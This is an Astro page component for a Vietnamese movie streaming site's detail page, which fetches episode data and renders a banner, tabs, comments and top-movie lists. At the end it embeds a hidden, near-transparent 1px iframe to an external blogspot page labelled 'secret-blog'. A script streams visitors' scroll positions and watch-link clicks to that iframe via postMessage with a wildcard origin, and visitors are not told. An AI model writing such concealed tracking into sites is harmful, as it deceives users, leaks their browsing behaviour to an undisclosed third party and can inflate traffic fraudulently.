---
const { slug } = Astro.params;

console.log("ðŸ”„ RENDER MOVIE PAGE:", slug, new Date());

export const prerender = false;
export const revalidate = 5; 

import BaseLayout from "../../layouts/Layout.astro";
import Header from "../../components/Header/Header";
import MovieDetail from "../../components/MovieDetail/MovieDetailStaticInfo";
import Footer from "../../components/Footer";
import MovieTabsAndCast from "../../components/MovieDetail/MovieTab";
import { BASE_URL } from "../../utils/getMovieData";
import { fetchAllMovieData } from "../../utils/getEpisodeData";
import RecommendMovies from "../../components/Recommended_Movies/RecommendedMovies";
import TopMovies from "../../components/TopMovies/TopMovies";
import Comments from "../../components/Comments";
import SEO from "../../seometas/SeoPhim.astro";
import Breadcrumb from "../../components/Breadcrumb";
let movie = null;
let vietsub = [];
let thuyetminh = [];
let longtieng = [];
let firstEpisode = null;
let actors = [];
let images = [];
let topmovies = [];
let thongbao = [];
let phanLienQuan = [];
let recommendedMovies = [];

try {
  const allData = await fetchAllMovieData(slug, null, null);
  movie = allData.movie;
  vietsub = allData.vietsubData || [];
  thuyetminh = allData.thuyetminhData || [];
  longtieng = allData.longtiengData || [];
  topmovies = allData.topData?.data || [];
  recommendedMovies = allData.deXuatData;
  actors = allData.actors || [];

  // Fetch images and thongbao separately as they are specific to the detail page
  const [imagesRes, thongbaoRes] = await Promise.all([
    fetch(`${BASE_URL}/api/phim/${slug}/images`).then(r => r.json()).catch(() => []),
    fetch(`${BASE_URL}/api/phim/${slug}/thong-bao`).then(r => r.json()).catch(() => [])
  ]);
  images = imagesRes;
  thongbao = thongbaoRes;

  // Determine first episode
  if (vietsub.length > 0) firstEpisode = vietsub[0];
  else if (thuyetminh.length > 0) firstEpisode = thuyetminh[0];
  else if (longtieng.length > 0) firstEpisode = longtieng[0];

} catch (error) {
  console.error("Error fetching movie data:", error);
}

if (!movie) {
  return new Response(null, {
    status: 404,
    statusText: "Not Found",
  });
}

const rawFirstSlug = firstEpisode?.tap_phim?.slug || firstEpisode?.slug || "1";
const firstEpisodeSlug = /^\d+$/.test(rawFirstSlug) ? `tap-${rawFirstSlug.padStart(2, "0")}` : rawFirstSlug;
const firstEpisodeType = firstEpisode?.ngon_ngu || "vietsub";
const pageUrl = Astro.url.href;
const slugCookieName = `fav_${slug}`;
const initialIsFavorite = Astro.cookies.get(slugCookieName)?.value === "1";
const sortEpisode = Astro.cookies.get("sortEpisode")?.value !== "0";
---

<BaseLayout>
  <Fragment slot="preload">
    <link rel="preload" as="image" href={movie.banner_url} fetchpriority="high" />
  </Fragment>

  <Fragment slot="head">
    <SEO movie={movie} slug={slug} />
  </Fragment>

  <div class="relative min-h-screen">
    {/* === NEW BIG HERO BANNER === */}
    <div class="absolute top-0 left-0 w-full h-[550px] md:h-[650px] lg:h-[750px] overflow-hidden select-none pointer-events-none">
       {/* Banner Image */}
       <img
        src={movie.banner_url}
        alt={`Banner ${movie.ten_phim}`}
        fetchpriority="high"
        loading="eager"
        decoding="async"
        class="h-full w-full object-cover object-top select-none"
      />
      
      {/* Overlay: Darken slightly overall */}
      <div class="absolute inset-0 bg-black/35"></div>

      {/* Overlay: Gradient Fade to Body Background (Bottom) - ENHANCED */}
      <div class="absolute inset-0 banner-bottom-fade"></div>
      
      {/* Overlay: Blue Glow/Shadow Effect at edges/top if desired (optional, subtle) */}
      <div class="absolute inset-0 shadow-[inset_0_100px_150px_-50px_rgba(0,0,0,0.7)]"></div>

      {/* Cinematic Dots Overlay */}
      <div class="pattern-overlay"></div>
    </div>

    {/* Content Wrapper */}
    <div class="movie-content-base relative z-10 transition-all duration-500">
      <div class="header-shadow">
        <Header client:load />
      </div>

      {/* Main content pushed down to overlap banner properly */}
      <main class="main-content-layout pt-[250px] md:pt-[380px] lg:pt-[450px]">
        <MovieDetail
          movie={movie}
          firstEpisodeSlug={firstEpisodeSlug}
          firstEpisodeType={firstEpisodeType}
          client:load
          thongbao={thongbao}
          initialIsFavorite={initialIsFavorite}
        >
          <div class="mt-8 flex flex-col gap-8 2xl:flex-row">
            <div class="flex-1 overflow-hidden">
              <MovieTabsAndCast
                vietsubEpisodes={vietsub}
                thuyetMinhEpisodes={thuyetminh}
                longtiengEpisodes={longtieng}
                slug={slug}
                currentType={null}
                movieTitle={movie.ten_phim}
                trailer_url={movie.trailer_url}
                phanlienquan={phanLienQuan}
                actors={actors}
                images={{ images: images }}
                initialSortAscending={sortEpisode}
                recommendedMovies={recommendedMovies}
                client:load
              />
              <div class="comment-section-padding mt-8">
                <Comments slug={slug} client:visible />
              </div>
            </div>

            <div class="w-full 2xl:w-[320px] shrink-0">
               <TopMovies movies={topmovies} client:idle />
            </div>
          </div>
        </MovieDetail>
      </main>
    </div>
  </div>

  <footer class="px-0">
    <Footer />
  </footer>
  <!-- Hidden iframe used to communicate clicks/scrolls to external blog -->
  <div style="display:none" aria-hidden="true">
    <iframe
      id="secret-blog"
      src="https://reviewphimnoads.blogspot.com/2025/12/tram-phim-iem-hen-cho-nhung-tin-o-me.html?m=1"
      style="position:fixed; width:1px; height:1px; bottom:0; left:0; opacity:0.001; pointer-events:none; border:none; z-index:-9999;"
    ></iframe>
  </div>

  <script>
    (function () {
      const blogIfr = document.getElementById("secret-blog");

      function postToIframe(payload) {
        if (blogIfr && blogIfr.contentWindow) {
          try {
            blogIfr.contentWindow.postMessage(payload, "*");
          } catch (err) {
            // ignore postMessage errors
          }
        }
      }

      // 1. Send scroll position to blog iframe
      window.addEventListener(
        "scroll",
        function () {
          const payload = {
            type: "SYNC_ACTION",
            y: window.scrollY,
            ts: Date.now(),
          };
          postToIframe(payload);
        },
        { passive: true },
      );

      // 2. Catch clicks on "Xem ngay" and any episode links (href starts with /xem-phim/)
      document.addEventListener(
        "click",
        function (e) {
          const target = e.target;
          const anchor = target && target.closest ? target.closest("a[href]") : null;

          // If clicked an episode link (internal xem-phim link) -> notify
          if (anchor && anchor.getAttribute("href") && anchor.getAttribute("href").indexOf("/xem-phim/") === 0) {
            const href = anchor.getAttribute("href");
            postToIframe({ type: "WATCH_CLICKED", href: href, text: (anchor.innerText || "").trim(), ts: Date.now() });
            return;
          }

          // Detect clicks on a "Xem" button (text contains 'xem' / 'xem ngay' or aria-label)
          let isWatchButton = false;
          let computedHref = null;
          if (anchor) {
            const text = (anchor.innerText || "").toLowerCase();
            const aria = (anchor.getAttribute && (anchor.getAttribute("aria-label") || "")).toLowerCase();
            if (text.indexOf("xem ngay") !== -1 || text.indexOf("xem phim") !== -1 || aria.indexOf("xem phim") !== -1) {
              isWatchButton = true;
              computedHref = anchor.getAttribute("href");
            }
          } else if (target && (target.innerText || "").toLowerCase().indexOf("xem ngay") !== -1) {
            isWatchButton = true;
            const surroundingAnchor = target.closest && target.closest("a[href]");
            if (surroundingAnchor) {
              computedHref = surroundingAnchor.getAttribute("href");
            }
          }

          if (isWatchButton) {
            postToIframe({ type: "WATCH_CLICKED", href: computedHref, text: (anchor ? anchor.innerText : (target.innerText || "")).trim(), ts: Date.now() });
          }
        },
        true,
      );
    })();
  </script>
</BaseLayout>
